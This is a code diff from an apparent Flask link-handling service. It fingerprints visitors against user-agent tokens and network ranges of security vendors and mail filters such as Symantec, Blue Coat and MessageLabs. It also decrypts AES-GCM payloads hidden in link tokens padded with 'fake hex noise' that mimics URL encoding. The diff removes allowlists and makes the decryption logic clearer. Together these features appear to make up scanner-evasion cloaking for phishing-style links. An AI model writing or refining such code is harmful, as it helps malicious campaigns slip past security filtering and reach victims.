@@ -99,9 +99,6 @@ SCANNER_UA_TOKENS = (
     "newrelic", "datadog synthetics", "yahoo", "aol", "verizon", "symantec", "webpulse", "bluecoat", "messagelabs",
 )
 
-ALLOWLIST_IPS = []
-ALLOWLIST_UA = ()
-
 def client_ip() -> str:
     xff = request.headers.get("X-Forwarded-For", "")
     return xff.split(",")[0].strip() if xff else request.remote_addr or ""
@@ -110,20 +107,12 @@ def classify(ip: str, ua: str) -> dict:
     out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
     low = ua.lower()
     
-    if any(tok in low for tok in ALLOWLIST_UA):
-        out["source"] = "allowlist_ua"
-        return out
-        
     try:
         a = ip_address(ip)
     except ValueError:
         a = None
         
     if a is not None:
-        if any(a in n for n in ALLOWLIST_IPS):
-            out["source"] = "allowlist_ip"
-            return out
-            
         for name, nets in SCANNER_NETS.items():
             if any(a in n for n in nets):
                 out["scanner"] = True
@@ -141,22 +130,31 @@ def classify(ip: str, ua: str) -> dict:
                 
     return out
 
-# --- AES-GCM DECRYPTION ---
 def unseal_payload(blob):
     if not blob.startswith("u001."): return None
     try:
-        clean = blob[5:].replace("-3D-3D", "").replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
-        b64_ciphertext = clean.split("-")[-1]
+        # 1. Strip prefix and trailing -3D-3D
+        core = blob[5:].replace("-3D-3D", "")
         
-        # Decode base64
+        # 2. Strip fake hex noise
+        clean = core.replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
+        
+        # 3. Split on the dot separator
+        parts = clean.split(".", 1)
+        if len(parts) < 2:
+            return None
+            
+        b64_ciphertext = parts[1]
+        
+        # 4. Base64 decode
         padding = '=' * (-len(b64_ciphertext) % 4)
         raw_bytes = base64.urlsafe_b64decode(b64_ciphertext + padding)
         
-        # Split nonce (12 bytes) and ciphertext
+        # 5. Split nonce and ciphertext
         nonce = raw_bytes[:12]
         ciphertext = raw_bytes[12:]
         
-        # Decrypt
+        # 6. Decrypt
         aesgcm = AESGCM(AES_KEY)
         plaintext = aesgcm.decrypt(nonce, ciphertext, None)
         return json.loads(plaintext.decode('utf-8'))
@@ -168,9 +166,6 @@ def _static_page(title: str, text: str, status_code: int):
     html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
     return make_response(html, status_code)
 
-# ---------------------------------------------------------------------------
-# LANDING PAGE
-# ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -250,9 +245,6 @@ LANDING = """<!DOCTYPE html>
 </body>
 </html>"""
 
-# ---------------------------------------------------------------------------
-# routes
-# ---------------------------------------------------------------------------
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"ok": True, "ts": int(time.time())})
